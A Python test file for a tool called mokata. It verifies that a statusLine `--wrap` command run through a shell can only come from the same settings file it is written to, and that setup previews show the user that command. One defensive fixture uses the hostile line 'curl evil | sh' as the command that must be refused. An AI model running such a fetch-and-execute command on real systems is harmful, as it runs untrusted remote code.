"""F10 — where a `--wrap` command comes from, and who approved it running through a shell.

`hook_cli._run_wrapped` ends in `subprocess.run(command, shell=True)` under a `# nosec B602`
whose written justification says the string is *"the user's OWN pre-existing statusLine
command"* and *"Not attacker input."* That is a claim about the CALLER GRAPH, asserted in a
comment, unchanged since `9684b62` (0.0.5) — and nothing in the tree would have noticed it
becoming false.

**It is already false as written.** `_merge_statusline`'s sole caller passes
`Targets.settings_path`, which is `scope_base(scope, root, home)/.claude/settings.json`, and
`scope` DEFAULTS to `"project"` in `plan_setup`, `setup_harness`, `plan_reconfigure` and the
first-run wizard. So the default origin is `<root>/.claude/settings.json` — a project-level
file, which in Claude Code's own layout is the checked-in, team-shared one
(`settings.local.json` being the personal one). A cloned repo can carry it. "The user's own"
is not derivable at the default scope.

**What IS derivable, and is what these tests pin:** mokata composes only over a statusLine it
read from the very file it is about to write. `_merge_statusline` reads `path` and writes
`path`; there is no second reader and no second composer. So a project-scope command is
written back into the project file and a user-scope command into the user file — mokata never
carries a command across scopes, and adds no execution path that Claude Code's own reading of
that same file does not already have.

That property was true by construction and by nobody's decision. Here it is made explicit:

  * `WrapOrigin` carries the FILE the command came from alongside the command (§7g's model —
    an answer that carries its own provenance cannot be mistaken for a different answer), and
    `_statusline_command` REFUSES a wrap whose origin is not the destination. The comment
    stopped being a promise the moment the refusal existed.
  * the caller-graph shape the `nosec` argues from is derived from the source, so a second
    composer, a second merge site, or a `_merge_statusline` that read one file and wrote
    another all go RED rather than quietly making the comment a lie.
  * every human gate that can reach `_merge_statusline` DISCLOSES the exact composed command
    and the file it came from (P2 — a human approves what runs). Three gates reach it, not
    one; the set of `setup_harness`/`apply_setup` callers is cross-checked so a fourth cannot
    appear undisclosed.
  * `shell=True` STAYS, and the pipe/`$VAR` behaviour it exists for is pinned by tests that
    run a real shell — because breaking a user's existing statusLine silently is worse than
    the row.

Copyright 2026 MoStack. Licensed under the Apache License, Version 2.0.
"""

import ast
import contextlib
import io
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

import _support  # noqa: F401  (puts src/ on the path)

from mokata import harness_setup, hook_cli, onboarding
from mokata.harness_setup import SetupError


# ==========================================================================================
# pure helpers over a SUPPLIED source (doc 85 §7i) — exercised on planted fixtures below so
# the derivation tests grade something rather than passing because the tree is quiet
# ==========================================================================================

_SCOPED = (ast.FunctionDef, ast.AsyncFunctionDef)


def _walk_scoped(tree: ast.AST):
    """(innermost enclosing `def` name, node) for every node — module level is ''.

    `ast.walk` alone cannot answer "which function is this in", and the version of this that
    re-walked each scope reported `_statusline_command` twice and every docstring as a
    module-level site. Provenance again: a node without its scope is not an answer."""
    def visit(node, scope):
        for child in ast.iter_child_nodes(node):
            yield scope, child
            inner = child.name if isinstance(child, _SCOPED) else scope
            yield from visit(child, inner)
    yield from visit(tree, "")


def _docstring_ids(tree: ast.AST) -> set:
    """The Constant nodes that are DOCSTRINGS. Prose describing `--wrap` is documentation;
    only code that builds or reads the flag is a site."""
    out = set()
    for node in ast.walk(tree):
        body = getattr(node, "body", None)
        if (isinstance(node, (ast.Module, ast.ClassDef) + _SCOPED) and body
                and isinstance(body[0], ast.Expr)
                and isinstance(body[0].value, ast.Constant)
                and isinstance(body[0].value.value, str)):
            out.add(id(body[0].value))
    return out


def call_sites(source: str, callee: str) -> list:
    """(enclosing def name, the Call node) for every call to `callee` — bare or attribute."""
    out = []
    for scope, node in _walk_scoped(ast.parse(source)):
        if not isinstance(node, ast.Call):
            continue
        fn = node.func
        if ((isinstance(fn, ast.Name) and fn.id == callee)
                or (isinstance(fn, ast.Attribute) and fn.attr == callee)):
            out.append((scope, node))
    return out


def literal_sites(source: str, needle: str) -> list:
    """Sorted, deduped enclosing-def names for every NON-DOCSTRING string literal holding
    `needle`.

    ⚠ There is deliberately NO separate `ast.JoinedStr` branch. An f-string's literal text is
    itself `ast.Constant` children of the JoinedStr, and `_walk_scoped` descends into them, so
    a JoinedStr branch would test the identical condition one level up. It WAS written that
    way, and mutant M16 of this stage's batch survived blinding it — the mutation changed
    nothing because the branch could never be the only thing that fired. Deleted rather than
    given a fixture to reach (stage 3's M08 shape): the untestable half of a guard is not
    coverage, it is a second path nobody exercises.

    What this therefore does NOT catch, stated rather than discovered: a needle SPLIT across a
    format boundary (`f"--wr{x}ap"`). No branch would have caught that one either."""
    tree = ast.parse(source)
    docs = _docstring_ids(tree)
    sites = set()
    for scope, node in _walk_scoped(tree):
        if id(node) in docs:
            continue
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            if needle in node.value:
                sites.add(scope)
    return sorted(sites)


def read_write_targets(source: str, func: str, reader: str, writer: str):
    """Inside `def func`, the argument EXPRESSIONS handed to `reader(...)` and `writer(...)`,
    rendered back to source text. The same text on both sides is the same file."""
    tree = ast.parse(source)
    fn = next(n for n in ast.walk(tree)
              if isinstance(n, ast.FunctionDef) and n.name == func)
    reads, writes = [], []
    for node in ast.walk(fn):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.args:
            if node.func.id == reader:
                reads.append(ast.unparse(node.args[0]))
            elif node.func.id == writer:
                writes.append(ast.unparse(node.args[0]))
    return reads, writes


def _src(module) -> str:
    return Path(module.__file__).read_text(encoding="utf-8")


def _src_package_files():
    # CORPUS: THE WORKING TREE. The question is "what code in the shipped package can compose a
    # `--wrap` argument", and an UNTRACKED `src/mokata/*.py` is both importable at runtime and
    # copied by `sync-public.sh`'s rsync — so the disk is truth here and the index would be
    # blind to exactly the module nobody committed.
    pkg = Path(harness_setup.__file__).resolve().parent
    return sorted(pkg.rglob("*.py"))


# ==========================================================================================
# 1. the caller graph the `nosec` argues from — derived, not asserted
# ==========================================================================================

class TestNosecJustificationIsDerivable(unittest.TestCase):

    def test_the_wrap_flag_has_exactly_one_writer_and_one_reader_in_the_package(self):
        """Both ends, because the justification is about the whole span: the ONLY thing that
        spells the flag into a settings.json string, and the ONLY thing that reads it back."""
        sites = []
        for path in _src_package_files():
            for fn in literal_sites(path.read_text(encoding="utf-8"), "--wrap"):
                sites.append((path.name, fn))
        self.assertEqual(
            sorted(sites),
            [("harness_setup.py", "_statusline_command"),      # writes it
             ("hook_cli.py", "statusline_main")],              # reads it
            "a second writer or reader of `--wrap` means the nosec's caller-graph claim "
            f"covers a path nobody checked: {sorted(sites)}")

    def test_statusline_command_has_exactly_two_callers_one_writes_one_previews(self):
        """`statusline_wrap_disclosure` composes the SAME line it shows the human, which is
        why the preview cannot drift from the write; `_merge_statusline` is the only one that
        then writes it. A third caller means a composition nobody has accounted for."""
        callers = sorted(fn for fn, _ in call_sites(_src(harness_setup), "_statusline_command"))
        self.assertEqual(callers, ["_merge_statusline", "statusline_wrap_disclosure"])
        writers = [fn for fn, _ in call_sites(_src(harness_setup), "_write_json")]
        self.assertNotIn("statusline_wrap_disclosure", writers)   # the preview is READ-ONLY

    def test_merge_statusline_has_exactly_one_caller_and_it_is_apply_setup(self):
        callers = [fn for fn, _ in call_sites(_src(harness_setup), "_merge_statusline")]
        self.assertEqual(callers, ["apply_setup"])

    def test_merge_statusline_reads_and_writes_THE_SAME_FILE(self):
        """The whole justification reduces to this. A `_merge_statusline` that read one
        settings.json and wrote another would carry a command across scopes, and the shell
        would then run something the destination's owner never had."""
        reads, writes = read_write_targets(_src(harness_setup), "_merge_statusline",
                                           "_load_json", "_write_json")
        self.assertEqual(reads, ["path"])
        self.assertEqual(writes, ["path"])

    def test_run_wrapped_has_exactly_one_caller_and_it_is_fed_from_argv(self):
        sites = call_sites(_src(hook_cli), "_run_wrapped")
        self.assertEqual([fn for fn, _ in sites], ["statusline_main"])
        first = sites[0][1].args[0]
        self.assertIsInstance(first, ast.Attribute)
        self.assertEqual(ast.unparse(first), "args.wrap")

    def test_the_nosec_comment_no_longer_claims_it_is_not_attacker_input(self):
        """The claim that was there for four releases is FALSE at the default scope: the
        project-level `.claude/settings.json` is Claude Code's checked-in settings file. A
        comment stating a falsehood is worse than no comment — a reader stops at it."""
        text = _src(hook_cli)
        self.assertNotIn("Not attacker input", text)
        self.assertIn("WrapOrigin", text)     # points at the pin, not at a promise


class TestTheDerivationHelpersThemselves(unittest.TestCase):
    """§7i — the helpers above pass on a quiet tree whether or not they work. Feed them a tree
    that is NOT quiet."""

    def test_literal_sites_finds_an_fstring_composer(self):
        """Via the f-string's own Constant part — the shipped composer IS an f-string, so this
        is the case that matters, and it needs no JoinedStr branch to be seen."""
        self.assertEqual(
            literal_sites('def a():\n    return f" --wrap {q}"\n', "--wrap"), ["a"])

    def test_literal_sites_is_blind_to_a_needle_split_across_a_format_hole(self):
        """Named, not discovered. `f"--wr{x}ap"` has no Constant holding the needle, so no
        implementation of this shape sees it."""
        self.assertEqual(literal_sites('def a():\n    return f"--wr{x}ap"\n', "--wrap"), [])

    def test_literal_sites_finds_a_second_composer(self):
        src = 'def a():\n    return " --wrap x"\ndef b():\n    return "--wrap y"\n'
        self.assertEqual(literal_sites(src, "--wrap"), ["a", "b"])

    def test_literal_sites_ignores_docstrings_but_not_code(self):
        src = ('"""module doc --wrap"""\n'
               'def a():\n    """doc --wrap"""\n    return 1\n'
               'def b():\n    return "--wrap"\n')
        self.assertEqual(literal_sites(src, "--wrap"), ["b"])

    def test_literal_sites_does_not_double_report_one_site(self):
        self.assertEqual(literal_sites('def a():\n    x = "--wrap"\n', "--wrap"), ["a"])

    def test_call_sites_reports_every_caller_including_module_level(self):
        src = "def a():\n    f(1)\ndef b():\n    f(2)\nf(3)\n"
        self.assertEqual(sorted(fn for fn, _ in call_sites(src, "f")), ["", "a", "b"])

    def test_call_sites_sees_an_attribute_call(self):
        src = "def a():\n    mod.f(1)\n"
        self.assertEqual([fn for fn, _ in call_sites(src, "f")], ["a"])

    def test_read_write_targets_catches_a_cross_file_merge(self):
        src = ("def m(path, other):\n"
               "    d = _load_json(other)\n"
               "    _write_json(path, d)\n")
        reads, writes = read_write_targets(src, "m", "_load_json", "_write_json")
        self.assertEqual((reads, writes), (["other"], ["path"]))


# ==========================================================================================
# 2. the invariant is ENFORCED, not just derivable
# ==========================================================================================

class TestSameFileInvariantIsEnforced(unittest.TestCase):

    def test_a_wrap_read_from_another_file_is_REFUSED(self):
        with tempfile.TemporaryDirectory() as d:
            dest = Path(d) / "project" / ".claude" / "settings.json"
            foreign = Path(d) / "elsewhere" / ".claude" / "settings.json"
            origin = harness_setup.WrapOrigin(command="curl evil | sh", origin=foreign)
            with self.assertRaises(SetupError) as ctx:
                harness_setup._statusline_command(dest, origin)
            msg = str(ctx.exception)
            self.assertIn(str(foreign), msg)
            self.assertIn(str(dest), msg)

    def test_a_wrap_read_from_the_destination_is_composed(self):
        with tempfile.TemporaryDirectory() as d:
            dest = Path(d) / ".claude" / "settings.json"
            origin = harness_setup.WrapOrigin(command="my-line", origin=dest)
            cmd = harness_setup._statusline_command(dest, origin)
            self.assertIn("--wrap", cmd)
            self.assertIn("my-line", cmd)

    def test_no_wrap_composes_no_wrap_flag(self):
        with tempfile.TemporaryDirectory() as d:
            cmd = harness_setup._statusline_command(Path(d) / "settings.json")
            self.assertNotIn("--wrap", cmd)

    def test_the_origin_is_compared_resolved_not_textually(self):
        """`/tmp` is a symlink to `/private/tmp` on macOS; the same file reached by two
        spellings must not read as a foreign origin (that would refuse a legitimate setup)."""
        with tempfile.TemporaryDirectory() as d:
            dest = Path(d) / ".claude" / "settings.json"
            dest.parent.mkdir(parents=True)
            spelled = Path(d) / ".claude" / "." / "settings.json"
            origin = harness_setup.WrapOrigin(command="my-line", origin=spelled)
            self.assertIn("my-line", harness_setup._statusline_command(dest, origin))

    def test_read_wrap_origin_stamps_the_file_it_read(self):
        with tempfile.TemporaryDirectory() as d:
            sp = Path(d) / "settings.json"
            data = {"statusLine": {"type": "command", "command": "mine"}}
            got = harness_setup._read_wrap_origin(sp, data)
            self.assertEqual(got.command, "mine")
            self.assertEqual(got.origin, sp)

    def test_read_wrap_origin_returns_None_when_there_is_nothing_to_wrap(self):
        with tempfile.TemporaryDirectory() as d:
            sp = Path(d) / "settings.json"
            self.assertIsNone(harness_setup._read_wrap_origin(sp, {}))

    def test_read_wrap_origin_unwraps_our_own_previous_composition(self):
        with tempfile.TemporaryDirectory() as d:
            sp = Path(d) / "settings.json"
            data = {"statusLine": {"type": "command",
                                   "command": '"x" statusline --wrap mokata-hook',
                                   harness_setup._WRAPPED_KEY: {"type": "command",
                                                                "command": "mine"}}}
            got = harness_setup._read_wrap_origin(sp, data)
            self.assertEqual(got.command, "mine")


# ==========================================================================================
# 3. P2 — the human sees the exact command before approving it
# ==========================================================================================

def _settings_with(root: Path, command: str) -> Path:
    sp = root / ".claude" / "settings.json"
    sp.parent.mkdir(parents=True, exist_ok=True)
    sp.write_text(json.dumps({"statusLine": {"type": "command", "command": command}}),
                  encoding="utf-8")
    return sp


class TestWrapDisclosure(unittest.TestCase):

    def test_three_states_never_two(self):
        """§7g — "nothing to wrap" and "I could not read the file" must not share a
        representation. The second one means setup is about to REFUSE."""
        self.assertEqual(
            {harness_setup.WRAP_NONE, harness_setup.WRAP_COMPOSES,
             harness_setup.WRAP_UNREADABLE},
            {"none", "composes", "unreadable"})

    def test_none_when_the_user_has_no_statusline(self):
        with tempfile.TemporaryDirectory() as d:
            got = harness_setup.statusline_wrap_disclosure("claude", d, "project")
            self.assertEqual(got.state, harness_setup.WRAP_NONE)
            self.assertEqual(harness_setup.render_wrap_disclosure(got), [])

    def test_composes_names_the_command_the_origin_file_and_the_shell(self):
        with tempfile.TemporaryDirectory() as d:
            _settings_with(Path(d), "my-line --json | head -1")
            got = harness_setup.statusline_wrap_disclosure("claude", d, "project")
            self.assertEqual(got.state, harness_setup.WRAP_COMPOSES)
            self.assertEqual(got.origin.command, "my-line --json | head -1")
            text = "\n".join(harness_setup.render_wrap_disclosure(got))
            # ⚠ ON ITS OWN LINE, not merely "somewhere in the text". Mutant M08 hid this line
            # and survived, because the command ALSO appears inside the shell-quoted composed
            # line further down — an assertion that could not tell the plain statement of what
            # runs from a quoted fragment of a longer command line.
            self.assertIn("it runs      : my-line --json | head -1", text)
            self.assertIn("--wrap", got.composed)                    # what lands in settings
            self.assertIn(got.composed, text)                        # ...and it is SHOWN
            self.assertIn("shell", text.lower())                     # ...and how it runs
            self.assertIn(str(Path(d).resolve() / ".claude" / "settings.json"), text)

    def test_project_scope_says_the_file_is_a_repository_file(self):
        """The disclosure has to carry the fact that made the old comment false: at project
        scope this file is not necessarily one the approver wrote."""
        with tempfile.TemporaryDirectory() as d:
            _settings_with(Path(d), "my-line")
            text = "\n".join(harness_setup.render_wrap_disclosure(
                harness_setup.statusline_wrap_disclosure("claude", d, "project")))
            self.assertIn("not necessarily one you wrote", text.lower())

    def test_unreadable_settings_is_its_own_state_and_names_the_file(self):
        with tempfile.TemporaryDirectory() as d:
            # ⚠ `.resolve()`, because the PRODUCT resolves: `harness_paths.scope_base` returns
            # `Path(root).resolve()`, so the path it prints is the canonical one. `tempfile` hands
            # back the UNcanonical one on more than one platform — `C:\Users\RUNNER~1\…` (the
            # 8.3 short name out of %TEMP%) on a GitHub Windows runner, `/var/folders/…` on macOS.
            #
            # ⭐ AND IT PASSED ON macOS FOR THE WRONG REASON, which is why it survived: macOS
            # resolution INSERTS a prefix (`/var/…` -> `/private/var/…`), so the unresolved string
            # is still a SUBSTRING and `assertIn` is satisfied. Windows resolution SUBSTITUTES in
            # the middle (`RUNNER~1` -> `runneradmin`), and the substring is gone. The assertion
            # was wrong on every platform; only one of them could show it.
            sp = (Path(d).resolve()) / ".claude" / "settings.json"
            sp.parent.mkdir(parents=True)
            sp.write_text("{not json", encoding="utf-8")
            got = harness_setup.statusline_wrap_disclosure("claude", d, "project")
            self.assertEqual(got.state, harness_setup.WRAP_UNREADABLE)
            text = "\n".join(harness_setup.render_wrap_disclosure(got))
            self.assertIn(str(sp), text)
            self.assertIn("refuse", text.lower())

    def test_a_non_claude_harness_wraps_nothing(self):
        with tempfile.TemporaryDirectory() as d:
            _settings_with(Path(d), "my-line")
            got = harness_setup.statusline_wrap_disclosure("aider", d, "project")
            self.assertEqual(got.state, harness_setup.WRAP_NONE)


class TestEveryApprovalGateDiscloses(unittest.TestCase):
    """Three human gates can reach `_merge_statusline`. Covering one of them would be the
    half-fix this project keeps filing."""

    def test_setup_plan_preview_shows_it(self):
        with tempfile.TemporaryDirectory() as d:
            _settings_with(Path(d), "my-line | head -1")
            plan = harness_setup.plan_setup("claude", root=d, home=d)
            text = harness_setup.render_setup_plan(plan)
            self.assertIn("my-line | head -1", text)
            self.assertIn("--wrap", text)

    def test_first_run_wizard_preview_shows_it(self):
        with tempfile.TemporaryDirectory() as d:
            _settings_with(Path(d), "my-line | head -1")
            text = onboarding.render_wizard_plan(
                "standard", {}, [], [], True, "claude", root=d, scope="project", home=d)
            self.assertIn("my-line | head -1", text)

    def test_reconfigure_diff_shows_it(self):
        with tempfile.TemporaryDirectory() as d:
            _settings_with(Path(d), "my-line | head -1")
            plan = onboarding.ReconfigPlan(
                initialized=True, current_profile="standard", target_profile="standard",
                detected={}, current_wired=[], harness_action="add", harness="claude",
                scope="project", root=d, home=d)
            text = onboarding.render_reconfigure_diff(plan)
            self.assertIn("my-line | head -1", text)

    def test_a_gate_that_wraps_nothing_stays_byte_identical(self):
        """Disclosure must cost nothing when there is nothing to disclose, or every existing
        preview test becomes a false failure and people stop reading the preview."""
        with tempfile.TemporaryDirectory() as d:
            text = harness_setup.render_setup_plan(
                harness_setup.plan_setup("claude", root=d, home=d))
            self.assertNotIn("--wrap", text)

    # DECLARATION vs CALL cross-check. Two sets, not one (§7g): "renders its own preview and
    # gates on it" and "delegates the gate to one that does" are different facts, and folding
    # them would let a new pass-through be read as a new gate — or worse, the reverse.
    GATED = {
        "setup_harness",     # render_setup_plan       -> `mokata setup`
        "run_wizard",        # render_wizard_plan      -> first-run wizard
        "run_reconfigure",   # render_reconfigure_diff -> `mokata reconfigure`
    }
    PASSTHROUGH = {
        "cmd_setup",         # argparse shim; the gate is setup_harness's own
    }

    def test_the_set_of_setup_drivers_is_the_set_of_declared_ones(self):
        """If a fifth function starts driving `setup_harness`/`apply_setup`, this goes RED and
        someone must say which set it is in — instead of it silently composing a shell command
        nobody was shown."""
        callers = set()
        for path in _src_package_files():
            source = path.read_text(encoding="utf-8")
            for callee in ("setup_harness", "apply_setup"):
                for fn, _node in call_sites(source, callee):
                    callers.add(fn)
        declared = self.GATED | self.PASSTHROUGH
        self.assertEqual(callers, declared,
                         f"undeclared setup driver(s): {callers ^ declared}")

    #  driver -> the preview it renders and gates on
    RENDERERS = {"setup_harness": "render_setup_plan",
                 "run_wizard": "render_wizard_plan",
                 "run_reconfigure": "render_reconfigure_diff"}

    def test_every_gated_driver_still_emits_its_own_preview(self):
        emits = set()
        for path in _src_package_files():
            source = path.read_text(encoding="utf-8")
            for driver, renderer in self.RENDERERS.items():
                if driver in {fn for fn, _ in call_sites(source, renderer)}:
                    emits.add(driver)
        self.assertEqual(emits, self.GATED)

    def test_the_wrap_disclosure_is_pulled_in_by_exactly_those_previews(self):
        """One renderer of the disclosure, reached from all three previews and nothing else —
        so preview and apply cannot drift, and no preview can quietly drop it."""
        wired = set()
        for path in _src_package_files():
            wired |= {fn for fn, _ in
                      call_sites(path.read_text(encoding="utf-8"), "render_wrap_disclosure")}
        self.assertEqual(wired, set(self.RENDERERS.values()),
                         f"a human gate that does not disclose the wrap: {wired}")


# ==========================================================================================
# 4. the NEGATIVE — `shell=True` is why an existing statusLine keeps working
# ==========================================================================================

#: Why a POSIX-shell-syntax assertion does not run on Windows. Named, so the skip reads as an
#: UN-RUN check rather than as a pass (doc 85 §7g).
_NT_SHELL_REASON = ("`shell=True` is cmd.exe on Windows, where POSIX shell syntax is not shell "
                    "syntax at all — this asserts a POSIX-shell property and cannot be RUN here. "
                    "Whether mokata should compose through cmd.exe is a PRODUCT question, filed "
                    "as WRAP-STATUSLINE-SHELL-IS-CMD-ON-WINDOWS.")


class TestShellSemanticsSurvive(unittest.TestCase):
    """`shlex.split` would silently break these. Breaking a user's statusLine without telling
    them is worse than the row, so each is a real shell, not a mock."""

    def test_a_pipe_still_works(self):
        self.assertEqual(hook_cli._run_wrapped("echo hello | tr a-z A-Z", ""), "HELLO")

    @unittest.skipIf(os.name == "nt", _NT_SHELL_REASON)
    def test_a_shell_variable_still_expands(self):
        """⚠ POSIX-SHELL SYNTAX, so this is a POSIX-shell claim and now says so.

        `_run_wrapped` uses `shell=True`, and `shell=True` means `cmd.exe` on Windows — where
        `$VAR` is not a variable, it is four literal characters. The assertion was right about
        what it tested and wrong about where: it read as "mokata preserves shell semantics" and
        actually asserted "the ambient shell is POSIX". It reded on all three Windows legs of run
        32094654167 for exactly that.

        The skip is NOT the whole answer and must not be read as one: whether mokata should be
        composing a statusLine through `cmd.exe` at all is a PRODUCT question this round does not
        settle, and it is filed as `WRAP-STATUSLINE-SHELL-IS-CMD-ON-WINDOWS` (doc 84) rather than
        buried under a green. What this decorator fixes is the test telling a lie; it does not
        claim the product is right."""
        os.environ["MOKATA_F10_PROBE"] = "expanded"
        try:
            self.assertEqual(hook_cli._run_wrapped("echo $MOKATA_F10_PROBE", ""), "expanded")
        finally:
            os.environ.pop("MOKATA_F10_PROBE", None)

    def test_the_payload_still_reaches_the_wrapped_command_on_stdin(self):
        self.assertEqual(hook_cli._run_wrapped("cat | head -1", "payload-line\nsecond"),
                         "payload-line")

    def test_a_pipe_survives_the_round_trip_through_settings_json(self):
        """The composition is `shlex.quote`d into a settings string that a shell later
        re-splits. Compose it, read it back the way argparse would, and run it."""
        import shlex
        with tempfile.TemporaryDirectory() as d:
            sp = _settings_with(Path(d), "echo hello | tr a-z A-Z")
            harness_setup._merge_statusline(sp)
            composed = json.loads(sp.read_text(encoding="utf-8"))["statusLine"]["command"]
            argv = shlex.split(composed)
            self.assertIn("--wrap", argv)
            recovered = argv[argv.index("--wrap") + 1]
            self.assertEqual(recovered, "echo hello | tr a-z A-Z")
            self.assertEqual(hook_cli._run_wrapped(recovered, ""), "HELLO")

    def test_statusline_main_prints_the_wrapped_output(self):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = hook_cli.statusline_main(["--wrap", "echo hi | tr a-z A-Z"])
        self.assertEqual(rc, 0)
        self.assertEqual(buf.getvalue().strip(), "HI")

    def test_a_single_quote_in_the_users_command_survives_composition(self):
        import shlex
        with tempfile.TemporaryDirectory() as d:
            nasty = """echo 'it'"'"'s fine'"""
            sp = _settings_with(Path(d), nasty)
            harness_setup._merge_statusline(sp)
            composed = json.loads(sp.read_text(encoding="utf-8"))["statusLine"]["command"]
            argv = shlex.split(composed)
            self.assertEqual(argv[argv.index("--wrap") + 1], nasty)


# ==========================================================================================
# 5. the user's settings.json is THEIR data (the one pre-1.0 compatibility exception)
# ==========================================================================================

class TestUnsetupStillRestoresVerbatim(unittest.TestCase):

    def test_round_trip_restores_the_original_block_byte_for_byte(self):
        with tempfile.TemporaryDirectory() as d:
            original = {"type": "command", "command": "echo A | tr a-z A-Z", "padding": 7}
            sp = Path(d) / ".claude" / "settings.json"
            sp.parent.mkdir(parents=True)
            sp.write_text(json.dumps({"statusLine": original, "other": {"keep": True}}),
                          encoding="utf-8")
            harness_setup._merge_statusline(sp)
            self.assertIn("--wrap", json.loads(
                sp.read_text(encoding="utf-8"))["statusLine"]["command"])
            harness_setup.unsetup_harness("claude", root=d, home=d, assume_yes=True,
                                          out=lambda _s: None)
            data = json.loads(sp.read_text(encoding="utf-8"))
            self.assertEqual(data["statusLine"], original)
            self.assertEqual(data["other"], {"keep": True})


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
